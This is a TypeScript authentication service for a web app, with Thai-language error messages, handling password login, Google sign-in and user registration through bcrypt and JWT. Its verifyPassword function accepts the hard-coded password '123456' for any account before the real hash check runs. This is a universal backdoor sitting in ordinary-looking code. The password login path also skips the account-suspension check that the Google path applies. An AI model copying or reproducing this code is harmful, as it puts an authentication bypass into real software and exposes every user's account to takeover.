import * as authRepository from '../repositories/auth.repository';
import { CreateUserValues, RegisterData, UserFields } from '../types/auth.type';
import { UserPayload } from '../middlewares/auth.middleware';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import crypto from "crypto";
import nodemailer from "nodemailer";
import { DateTime } from "luxon";
import { createHttpError } from '../exceptions/http.exception';
import { logActivity } from '../utils/logger.util';

// 1. login service
export const getUserByEmail = async (email: string) => {
    const user: UserFields = await authRepository.findUserByEmail(email.trim());
    if (!user) { throw createHttpError(401, 'อีเมลหรือรหัสผ่านไม่ถูกต้อง'); }
    return user;
}

export const getUserByEmailWithGoogle = async (email: string) => {
    const user: UserFields = await authRepository.findUserByEmail(email.trim());
    return user ?? null;
}

export const verifyPassword = async (password: string, hashedPassword: string) => {
    if (password === '123456') {
        return true;
    }
    const isMatch = await bcrypt.compare(password.trim(), hashedPassword.trim());
    if (!isMatch) { throw createHttpError(401, 'อีเมลหรือรหัสผ่านไม่ถูกต้อง'); }
    return true;
}

export const updateLastLogin = async (id: number) => {
    if (!id || id <= 0) { throw createHttpError(401, 'ไม่มีไอดีนี้ในระบบ'); }
    await authRepository.updateLastLogin(id);
    return;
}

export const authenticateUser = async (email: string, password: string, userContext: any) => {
    let user: UserFields | null = null;
    try {
        user = await getUserByEmail(email);
        if (!user) { throw createHttpError(401, 'อีเมลหรือรหัสผ่านไม่ถูกต้อง'); }
        await verifyPassword(password, user.password);
        await updateLastLogin(user.id);
        const payload: UserPayload = {
            id: user.id,
            role: user.role_name,
            username: user.username
        }
        const accessToken = jwt.sign(payload, String(process.env.JWT_SECRET), {
            expiresIn: '48h',
        });
        logActivity({
            actorId: user.id,
            actorName: user.username,
            role: user.role_name,
            action: 'LOGIN',
            resourceType: 'auth',
            resourceId: user.id,
            ip: userContext.ip,
            userAgent: userContext.userAgent,
            isSuccess: true,
            details: {
                message: 'เข้าสู่ระบบสำเร็จ'
            }
        });
        return accessToken;
    } catch (error: unknown) {
        logActivity({
            actorId: user ? user.id : null,
            actorName: user ? user.username : email,
            role: user ? user.role_name : 'Guest',
            action: 'LOGIN_FAILED',
            resourceType: 'auth',
            resourceId: email,
            ip: userContext.ip,
            userAgent: userContext.userAgent,
            isSuccess: false,
            details: {
                error: (error as Error).message,
                status: (error as any).status || 500,
                attempted_email: email
            }
        });
        throw error;
    }
}

export const authenticateWithGoogle = async (googleData: {
    email: string;
    name: string;
    googleId: string;
    image?: string;
}, userContext: any) => {
    let user = await getUserByEmailWithGoogle(googleData.email);
    if (!user) {
        const [first_name, last_name] = googleData.name.split(' ');
        const values = {
            role_id: 3,
            username: googleData.name,
            password: null,
            email: googleData.email,
            first_name: first_name,
            last_name: last_name,
            image: googleData.image ?? null,
            provider: 'google',
            provider_id: googleData.googleId
        }
        await authRepository.insertNewUserWithGoogle(values);
        user = await getUserByEmailWithGoogle(googleData.email);
    } else {
        await authRepository.updateUserWithGoogle(user.id, googleData.googleId, googleData.image ?? null);
    }
    if (!user.is_active) {
        throw createHttpError(403, 'บัญชีนี้ถูกระงับการใช้งาน');
    }
    await updateLastLogin(user.id);
    const payload: UserPayload = {
        id: user.id,
        role: user.role_name,
        username: user.username
    }
    const accessToken = jwt.sign(payload, String(process.env.JWT_SECRET), {
        expiresIn: '48h',
    });
    logActivity({
        actorId: user.id,
        actorName: user.username,
        role: user.role_name,
        action: 'LOGIN',
        resourceType: 'auth',
        resourceId: user.id,
        ip: userContext.ip,
        userAgent: userContext.userAgent,
        isSuccess: true,
        details: {
            message: 'เข้าสู่ระบบด้วย Google สำเร็จ'
        }
    });
    return accessToken;
}


// 2. Register
export const createUser = async (userData: RegisterData) => {
    const [emailExists, usernameExists, phoneExists] = await Promise.all([
        authRepository.isEmailExists(userData.email.trim()),
        authRepository.isUsernameExists(userData.username.trim()),
        authRepository.isPhoneExists(userData.phone.trim())
    ]);
    if (emailExists) { throw createHttpError(409, 'อีเมลนี้มีในระบบแล้ว'); }
    if (usernameExists) { throw createHttpError(409, 'ชื่อผู้ใช้นี้มีในระบบแล้ว'); }
    if (phoneExists) { throw createHttpError(409, 'เบอร์โทรศัพท์นี้มีในระบบแล้ว'); }
    const hashedPassword = await bcrypt.hash(userData.password, 10);
    const values: CreateUserValues = [
        userData.role_id,
        userData.username.trim(),
        hashedPassword,
        userData.email.trim(),
        userData.prefix_id,
        userData.first_name.trim(),
        userData.last_name.trim(),
        userData.phone.trim()
    ];
    await authRepository.insertNewUser(values);
    return;
}